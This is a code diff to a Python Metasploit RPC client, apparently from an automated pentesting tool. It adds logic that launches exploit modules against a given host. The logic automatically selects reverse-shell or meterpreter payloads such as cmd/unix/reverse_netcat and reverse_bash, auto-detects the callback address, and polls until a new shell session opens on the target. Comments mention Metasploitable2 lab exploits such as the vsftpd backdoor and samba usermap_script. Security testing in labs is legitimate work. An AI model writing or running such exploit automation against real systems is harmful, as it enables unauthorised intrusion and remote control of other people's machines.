@@ -362,6 +362,21 @@ class MetasploitRPCClient:
             logger.error("Module search failed: %s", exc)
         return results
 
+    def get_compatible_payloads(self, module_path: str) -> list[str]:
+        """Query Metasploit for all payloads compatible with a module."""
+        self._require_connection()
+        try:
+            resp = self._rpc("module.compatible_payloads", module_path)
+            payloads = resp.get(b"payloads", resp.get("payloads", []))
+            return [
+                p.decode() if isinstance(p, bytes) else str(p) for p in payloads
+            ]
+        except Exception as exc:
+            logger.debug(
+                "Could not query compatible payloads for %s: %s", module_path, exc
+            )
+            return []
+
     # -- exploit execution --------------------------------------------------
 
     def execute_exploit(
@@ -382,22 +397,118 @@ class MetasploitRPCClient:
         if not self.validate_module_exists(module_path):
             raise MetasploitModuleError(f"Module not found: {module_path}")
 
+        # --- resolve compatible payload ----------------------------------
+        resolved_payload = options.payload
+        compatible = self.get_compatible_payloads(module_path)
+        if compatible:
+            if (
+                options.payload
+                and options.payload != "generic/shell_reverse_tcp"
+                and options.payload in compatible
+            ):
+                resolved_payload = options.payload
+            else:
+                # Pick the best compatible payload:
+                # 1. HTTP-staged x86 meterpreter (MSF default for Linux RCE, vsftpd, etc.)
+                chosen = next(
+                    (
+                        p
+                        for p in compatible
+                        if "http/x86/meterpreter_reverse_tcp" in p
+                    ),
+                    None,
+                )
+                # 2. Standard Unix command reverse shells (Samba, UnrealIRCd, Distcc, etc.)
+                if not chosen:
+                    chosen = next(
+                        (
+                            p
+                            for p in compatible
+                            if p
+                            in (
+                                "cmd/unix/reverse",
+                                "cmd/unix/reverse_netcat",
+                                "cmd/unix/reverse_bash",
+                                "cmd/unix/reverse_perl",
+                                "cmd/unix/reverse_python",
+                            )
+                        ),
+                        None,
+                    )
+                # 3. HTTP-staged x64 meterpreter
+                if not chosen:
+                    chosen = next(
+                        (
+                            p
+                            for p in compatible
+                            if "http/x64/meterpreter_reverse_tcp" in p
+                        ),
+                        None,
+                    )
+                # 4. General meterpreter reverse TCP (PHP, Java, binary meterpreter)
+                if not chosen:
+                    chosen = next(
+                        (
+                            p
+                            for p in compatible
+                            if "meterpreter/reverse_tcp" in p
+                            or "meterpreter_reverse_tcp" in p
+                        ),
+                        None,
+                    )
+                # 5. Standard shell_reverse_tcp
+                if not chosen:
+                    chosen = next(
+                        (p for p in compatible if "shell_reverse_tcp" in p), None
+                    )
+                # 6. Any reverse payload
+                if not chosen:
+                    chosen = next((p for p in compatible if "reverse" in p), None)
+                # 7. Fallback to first compatible
+                if not chosen:
+                    chosen = compatible[0]
+
+                logger.info(
+                    "Auto-selected compatible payload '%s' for %s (requested: '%s')",
+                    chosen,
+                    module_path,
+                    options.payload,
+                )
+                resolved_payload = chosen
+
+        # --- resolve effective LHOST -------------------------------------
+        effective_lhost = options.lhost
+        if not effective_lhost or effective_lhost == "0.0.0.0":
+            try:
+                with socket.socket(socket.AF_INET, socket.SOCK_DGRAM) as s:
+                    s.connect((options.rhosts, 80))
+                    detected = s.getsockname()[0]
+                    if detected and detected != "127.0.0.1":
+                        effective_lhost = str(detected)
+            except Exception:
+                effective_lhost = "127.0.0.1"
+
         # --- build options dict ------------------------------------------
         opts: dict[str, Any] = {
             "RHOSTS": options.rhosts,
             "RPORT": str(options.rport),
-            "PAYLOAD": options.payload,
-            "LHOST": options.lhost,
+            "LHOST": effective_lhost,
             "LPORT": str(options.lport),
         }
+        if resolved_payload:
+            opts["PAYLOAD"] = resolved_payload
         opts.update(options.extra_options)
 
         logger.warning(
-            "Executing exploit %s against %s:%d",
+            "Executing exploit %s (payload: %s) against %s:%d",
             module_path,
+            resolved_payload,
             options.rhosts,
             options.rport,
         )
+
+        # Snapshot existing sessions before execution
+        prior_sessions = self._get_session_ids_for_host(options.rhosts)
 
         # --- fire --------------------------------------------------------
         parts = module_path.strip("/").split("/", 1)
@@ -442,7 +553,9 @@ class MetasploitRPCClient:
         # --- poll for session --------------------------------------------
         # 60 s: Metasploitable2 exploits (vsftpd backdoor, samba/usermap_script,
         # distcc_exec, etc.) can take 35-60 s to land a shell via RPC overhead.
-        session_id = self._wait_for_session(options.rhosts, timeout=60)
+        session_id = self._wait_for_session(
+            options.rhosts, timeout=60, prior_session_ids=prior_sessions
+        )
 
         if session_id is not None:
             logger.critical(
@@ -620,23 +733,54 @@ class MetasploitRPCClient:
                 "Not connected to msfrpcd — call connect() first"
             )
 
-    def _wait_for_session(
-        self,
-        target: str,
-        timeout: int = 30,
-    ) -> int | None:
-        """Poll for a new session on *target* up to *timeout* seconds."""
-        deadline = time.monotonic() + timeout
-        while time.monotonic() < deadline:
-            try:
-                raw = self._rpc("session.list")
-                if isinstance(raw, dict):
-                    for sid, info in raw.items():
+    def _get_session_ids_for_host(self, target: str) -> set[int]:
+        """Return the set of active session IDs currently open on target host."""
+        try:
+            raw = self._rpc("session.list")
+            if isinstance(raw, dict):
+                ids: set[int] = set()
+                for sid, info in raw.items():
+                    if isinstance(info, dict):
                         host = info.get(b"target_host", info.get("target_host", ""))
                         if isinstance(host, bytes):
                             host = host.decode()
                         if host == target:
-                            return int(sid)
+                            ids.add(int(sid))
+                return ids
+        except Exception:
+            pass
+        return set()
+
+    def _wait_for_session(
+        self,
+        target: str,
+        timeout: int = 60,
+        prior_session_ids: set[int] | None = None,
+    ) -> int | None:
+        """Poll for a new session on *target* up to *timeout* seconds."""
+        deadline = time.monotonic() + timeout
+        priors = prior_session_ids or set()
+        while time.monotonic() < deadline:
+            try:
+                raw = self._rpc("session.list")
+                if isinstance(raw, dict):
+                    # First check for newly spawned session not in prior snapshots
+                    for sid, info in raw.items():
+                        if isinstance(info, dict):
+                            host = info.get(b"target_host", info.get("target_host", ""))
+                            if isinstance(host, bytes):
+                                host = host.decode()
+                            if host == target and int(sid) not in priors:
+                                return int(sid)
+                    # If priors was empty, check for any session on target
+                    if not priors:
+                        for sid, info in raw.items():
+                            if isinstance(info, dict):
+                                host = info.get(b"target_host", info.get("target_host", ""))
+                                if isinstance(host, bytes):
+                                    host = host.decode()
+                                if host == target:
+                                    return int(sid)
             except Exception:
                 pass
             time.sleep(2)
